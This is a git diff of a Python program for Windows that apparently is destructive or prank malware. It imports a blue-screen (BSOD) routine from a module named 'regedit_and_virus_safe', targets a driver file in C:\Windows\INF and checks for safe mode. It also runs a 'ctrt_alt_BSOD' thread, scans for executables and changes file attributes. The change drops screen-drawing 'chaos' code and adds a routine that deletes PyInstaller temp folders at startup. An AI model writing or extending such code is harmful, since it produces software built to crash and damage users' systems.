@@ -1,14 +1,13 @@
 import ctypes
 import os
-import pygame
 import psutil
 import shutil
 import threading
 import sys
-import win32gui
 import time
+import tempfile
 from collections import defaultdict
-from gui import run_app, ChaosFormatter
+from gui import run_app
 from regedit_and_virus_safe import BSOD
 from multimedia import playMusic_runappmain, play_video_fullscreen, playmusic_for3, monitor_process, set_file_attributes
 
@@ -45,26 +44,16 @@ def resource_path(relative_path):
         base_path = os.path.join(os.path.abspath("."), "resources")
     return os.path.join(base_path, relative_path)
 
-
-#########################################################################3
-pygame.mixer.init()
-hdc = win32gui.GetDC(0)
-user32 = ctypes.windll.user32
-user32.SetProcessDPIAware()
-[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
-######################################################
-
-
 ###
 file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"
 TARGET_DIR = r"C:\Windows\INF"
 ###
 
-
 def is_safe_mode():
     SM_CLEANBOOT = 67
     mode = ctypes.windll.user32.GetSystemMetrics(SM_CLEANBOOT)
     return mode in (1, 2)
+
 
 def check_safemode():
     def russia():
@@ -75,6 +64,27 @@ def check_safemode():
         except Exception as e:
             print(f"Ошибка: {e}")
     threading.Thread(target=russia, daemon=True).start()
+
+
+def delete_mei():
+    temp_dir = tempfile.gettempdir()
+    current_meipass = getattr(sys, "_MEIPASS", "")
+
+    print(f"[DEBUG] TEMP DIR: {temp_dir}")
+    print(f"[DEBUG] CURRENT _MEIPASS: {current_meipass}")
+
+    for name in os.listdir(temp_dir):
+        full_path = os.path.join(temp_dir, name)
+        if name.startswith("_MEI") and os.path.isdir(full_path):
+            print(f"[DEBUG] Найдена папка: {full_path}")
+            if os.path.abspath(full_path) == os.path.abspath(current_meipass):
+                print(f"[SKIP] Пропущена текущая _MEIPASS: {full_path}")
+                continue
+            try:
+                shutil.rmtree(full_path, ignore_errors=False)
+                print(f"[OK] Удалена: {full_path}")
+            except Exception as e:
+                print(f"[ERROR] Не удалось удалить {full_path}: {e}")
 
 
 def copyicons():
@@ -133,9 +143,6 @@ def changetoeng():
         user32.PostMessageW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0, layout)
     set_keyboard_layout(LANG_ENGLISH_US)
 
-def start_chaos_in_thread():
-    """Запускает ChaosFormatter в отдельном потоке."""
-    threading.Thread(target=lambda: ChaosFormatter(), daemon=True).start()
 
 def checkexe():
     EXECUTABLE_EXTENSIONS = {".exe", ".bat", ".cmd", ".vbs", ".ps1"}
@@ -286,6 +293,8 @@ def checktxt():
 if __name__ == "__main__":
 
     check_safemode()
+
+    delete_mei()
 
     wait = threading.Thread(target=ctrt_alt_BSOD)
     wait.start()
